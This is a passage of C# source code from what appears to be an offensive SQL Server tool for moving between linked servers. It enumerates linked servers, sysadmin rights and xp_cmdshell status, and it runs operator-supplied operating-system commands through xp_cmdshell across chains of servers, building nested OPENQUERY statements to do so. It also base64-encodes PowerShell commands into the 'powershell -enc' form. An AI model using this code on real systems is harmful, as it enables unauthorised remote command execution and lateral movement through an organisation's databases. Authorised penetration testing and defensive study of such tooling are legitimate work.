                    Console.WriteLine($"xp_cmdshell is {(xpCmdEnabled ? "enabled" : "disabled")} on {linkedServer}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error checking xp_cmdshell status: {ex.Message}");
                }

                // Check for nested linked servers
                string linkedServersQuery = "SELECT name FROM sys.servers WHERE is_linked = 1";
                Console.WriteLine("\nChecking for linked servers on this server...");

                List<string> nestedLinkedServers = new List<string>();
                try
                {
                    if (useOpenQuery)
                    {
                        SqlHelper.ExecuteLinkedServerQueryUsingOpenQuery(connection, linkedServer, linkedServersQuery, reader => {
                            string nestedServer = reader["name"].ToString();
                            nestedLinkedServers.Add(nestedServer);
                            Console.WriteLine($" - {nestedServer}");
                        });
                    }
                    else
                    {
                        SqlHelper.ExecuteLinkedServerQueryUsingExecAt(connection, linkedServer, linkedServersQuery, reader => {
                            string nestedServer = reader["name"].ToString();
                            nestedLinkedServers.Add(nestedServer);
                            Console.WriteLine($" - {nestedServer}");
                        });
                    }

                    if (nestedLinkedServers.Count == 0)
                    {
                        Console.WriteLine("No linked servers found on this server.");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error enumerating nested linked servers: {ex.Message}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error enumerating linked server: {ex.Message}");
            }
        }

        /// <summary>
        /// Enumerate a server through a chain of linked servers
        /// </summary>
        private static void EnumerateServerThroughChain(SqlConnection connection, List<string> serverChain)
        {
            string targetServer = serverChain[serverChain.Count - 1];
            Console.WriteLine($"Enumerating {targetServer} through chain: {string.Join(" -> ", serverChain)}");

            try
            {
                // Get server name
                string serverNameQuery = "SELECT @@SERVERNAME AS name";
                Console.WriteLine("\nServer Information:");

                ExecuteQueryThroughLinkedServerChain(connection, serverChain, serverNameQuery, reader => {
                    Console.WriteLine($"Server name: {reader["name"]}");
                });

                // Get user context
                string userQuery = "SELECT SYSTEM_USER AS username";

                ExecuteQueryThroughLinkedServerChain(connection, serverChain, userQuery, reader => {
                    Console.WriteLine($"Current user: {reader["username"]}");
                });

                // Check sysadmin role
                string sysadminQuery = "SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin";

                ExecuteQueryThroughLinkedServerChain(connection, serverChain, sysadminQuery, reader => {
                    bool isSysadmin = Convert.ToInt32(reader["is_sysadmin"]) == 1;
                    Console.WriteLine($"Is sysadmin: {(isSysadmin ? "Yes" : "No")}");
                });

                // Get linked servers on the target
                string linkedServersQuery = "SELECT name FROM sys.servers WHERE is_linked = 1";
                Console.WriteLine("\nLinked Servers:");

                bool foundServers = false;

                ExecuteQueryThroughLinkedServerChain(connection, serverChain, linkedServersQuery, reader => {
                    foundServers = true;
                    Console.WriteLine($" - {reader["name"]}");
                });

                if (!foundServers)
                {
                    Console.WriteLine("No linked servers found.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error enumerating server through chain: {ex.Message}");
            }
        }

        /// <summary>
        /// Execute a command on a single linked server
        /// </summary>
        private static void ExecuteCommandOnLinkedServer(SqlConnection connection, string linkedServer, CommandLineArguments args)
        {
            if (string.IsNullOrEmpty(args.OsCommand))
            {
                Console.Write("Enter command to execute: ");
                args.OsCommand = Console.ReadLine();
            }

            Console.WriteLine($"\nExecuting command on {linkedServer}: {args.OsCommand}");

            try
            {
                // Generate PowerShell command with proper encoding if needed
                if (args.OsCommand.Contains("powershell") && !args.OsCommand.Contains("-enc"))
                {
                    Console.Write("PowerShell command detected. Encode it? (Y/N): ");
                    string encodeResponse = Console.ReadLine();

                    if (encodeResponse.Equals("Y", StringComparison.OrdinalIgnoreCase))
                    {
                        string parsed = args.OsCommand
                            .Replace("powershell", "")
                            .Replace("powershell.exe", "")
                            .Trim();

                        string encoded = EncodeBase64(parsed);
                        args.OsCommand = $"powershell -enc {encoded}";
                        Console.WriteLine($"Encoded command: {args.OsCommand}");
                    }
                }

                // Execute the command on the linked server
                SqlHelper.ExecuteCommandOnLinkedServer(connection, linkedServer, args.OsCommand, args.UseOpenQuery);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error executing command on linked server: {ex.Message}");
            }
        }

        /// <summary>
        /// Execute a command on the last server in a chain
        /// </summary>
        private static void ExecuteCommandThroughChain(SqlConnection connection, List<string> serverChain, CommandLineArguments args)
        {
            string targetServer = serverChain[serverChain.Count - 1];

            if (string.IsNullOrEmpty(args.OsCommand))
            {
                Console.Write("Enter command to execute: ");
                args.OsCommand = Console.ReadLine();
            }

            Console.WriteLine($"\nExecuting command on {targetServer} through chain: {string.Join(" -> ", serverChain)}");
            Console.WriteLine($"Command: {args.OsCommand}");

            try
            {
                // Check if PowerShell command needs encoding
                if (args.OsCommand.Contains("powershell") && !args.OsCommand.Contains("-enc"))
                {
                    Console.Write("PowerShell command detected. Encode it? (Y/N): ");
                    string encodeResponse = Console.ReadLine();

                    if (encodeResponse.Equals("Y", StringComparison.OrdinalIgnoreCase))
                    {
                        string parsed = args.OsCommand
                            .Replace("powershell", "")
                            .Replace("powershell.exe", "")
                            .Trim();

                        string encoded = EncodeBase64(parsed);
                        args.OsCommand = $"powershell -enc {encoded}";
                        Console.WriteLine($"Encoded command: {args.OsCommand}");
                    }
                }

                // Execute xp_cmdshell command through the chain
                string cmdQuery = $"EXEC xp_cmdshell '{args.OsCommand.Replace("'", "''")}'";

                ExecuteQueryThroughLinkedServerChain(connection, serverChain, cmdQuery, reader => {
                    if (reader[0] != null)
                    {
                        Console.WriteLine(reader[0]);
                    }
                });
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error executing command through chain: {ex.Message}");
            }
        }
        /// <summary>
        /// Execute on a single linked server
        /// </summary>
        private static void ExecuteOnSingleLinkedServer(SqlConnection connection, string linkedServer, bool useOpenQuery, string command)
        {
            Console.WriteLine($"\nWorking with linked server: {linkedServer}");

            // First check if we can enumerate the linked server
            if (string.IsNullOrEmpty(command))
            {
                // Just enumerate the linked server information
                EnumerateLinkedServer(connection, linkedServer, useOpenQuery);

                // If no command was provided, prompt for one
                Console.Write("\nDo you want to execute a command on the linked server? (Y/N): ");
                string executeResponse = Console.ReadLine();

                if (executeResponse.Equals("Y", StringComparison.OrdinalIgnoreCase))
                {
                    Console.Write("Enter command to execute: ");
                    command = Console.ReadLine();
                }
                else
                {
                    return;
                }
            }

            // Execute command if specified
            if (!string.IsNullOrEmpty(command))
            {
                Console.WriteLine($"\nExecuting command on {linkedServer}: {command}");

                try
                {
                    // Generate PowerShell command with proper encoding if needed
                    if (command.Contains("powershell") && !command.Contains("-enc"))
                    {
                        Console.Write("PowerShell command detected. Encode it? (Y/N): ");
                        string encodeResponse = Console.ReadLine();

                        if (encodeResponse.Equals("Y", StringComparison.OrdinalIgnoreCase))
                        {
                            string parsed = command
                                .Replace("powershell", "")
                                .Replace("powershell.exe", "")
                                .Trim();

                            string encoded = EncodeBase64(parsed);
                            command = $"powershell -enc {encoded}";
                            Console.WriteLine($"Encoded command: {command}");
                        }
                    }

                    // Execute the command on the linked server
                    SqlHelper.ExecuteCommandOnLinkedServer(connection, linkedServer, command, useOpenQuery);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error executing command on linked server: {ex.Message}");
                }
            }
        }

        #endregion

        #region Helper Methods

        /// <summary>
        /// Base64 encode a string using Unicode encoding (for PowerShell)
        /// </summary>
        private static string EncodeBase64(string value)
        {
            var valueBytes = Encoding.Unicode.GetBytes(value);
            return Convert.ToBase64String(valueBytes);
        }

        /// <summary>
        /// Builds a properly escaped nested OPENQUERY statement for linked server chains
        /// </summary>
        /// <param name="serverChain">List of servers in the chain (e.g. sql1,sql2,sql3)</param>
        /// <param name="finalQuery">The query to execute on the last server in the chain</param>
        /// <returns>A properly escaped nested OPENQUERY statement</returns>
        private static string BuildNestedOpenQuery(List<string> serverChain, string finalQuery)
        {
            if (serverChain == null || serverChain.Count == 0)
                return finalQuery;

            // If only one server, simple case
            if (serverChain.Count == 1)
                return $"SELECT * FROM OPENQUERY([{serverChain[0]}], '{finalQuery.Replace("'", "''")}')";

            // Start with the innermost query (on the last server)
            string currentQuery = finalQuery;

            // We'll work backwards from the last server to the first
            for (int i = serverChain.Count - 1; i >= 0; i--)
            {
                // Current server in the chain
                string server = serverChain[i];

                // For the last server in the chain
                if (i == serverChain.Count - 1)
                {
                    // Escape any single quotes in the final query
                    string escapedQuery = currentQuery.Replace("'", "''");

                    // Wrap in OPENQUERY
                    currentQuery = $"SELECT * FROM OPENQUERY([{server}], '{escapedQuery}')";
                }
                // For intermediate servers
                else
                {
                    // For each level, double the quotes
                    string escapedQuery = currentQuery;

                    // Calculate how many times to double the quotes
                    // When we're at the first server (index 0), we don't need extra escaping
                    // When we're at an intermediate server, we need to double quotes for each level of nesting
                    int levels = serverChain.Count - 1 - i;

                    // Apply quote doubling for the appropriate number of levels
                    for (int j = 0; j < levels; j++)
                    {
                        escapedQuery = escapedQuery.Replace("'", "''");
                    }

                    // Wrap in OPENQUERY
                    currentQuery = $"SELECT * FROM OPENQUERY([{server}], '{escapedQuery}')";
                }
            }

            return currentQuery;
        }

        /// <summary>
        /// Executes a query through a linked server chain
        /// </summary>
        private static void ExecuteQueryThroughLinkedServerChain(SqlConnection connection, List<string> serverChain, string finalQuery, Action<SqlDataReader> processRow = null)
        {
            string nestedQuery = BuildNestedOpenQuery(serverChain, finalQuery);
            // Console.WriteLine($"DEBUG - Generated query: {nestedQuery}");

            try
            {
                SqlHelper.ExecuteReaderQuery(connection, nestedQuery, processRow);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error executing through linked server chain: {ex.Message}");
            }
        }
        #endregion
    }

    /// <summary>
    /// Extension methods for strings
    /// </summary>
    public static class ExtensionMethods
    {
        /// <summary>
        /// Base64 encode a string using Unicode encoding (for PowerShell)
        /// </summary>
        public static string EncodeBase64(this string value)
        {
            var valueBytes = Encoding.Unicode.GetBytes(value);
            return Convert.ToBase64String(valueBytes);
        }
    }
}